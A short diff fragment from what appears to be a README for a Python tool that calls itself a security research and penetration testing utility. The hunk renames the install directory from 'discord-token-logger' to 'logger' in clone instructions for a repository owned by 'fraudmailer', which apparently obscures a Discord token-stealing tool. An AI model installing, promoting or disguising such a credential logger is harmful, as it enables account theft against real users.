@@ -18,7 +18,7 @@ A Python-based utility designed for security research and penetration testing th
 1. Clone the repository:
 ```bash
 git clone https://github.com/fraudmailer/logger.git
-cd discord-token-logger
+cd logger
 ```
 
 2. Install required dependencies:
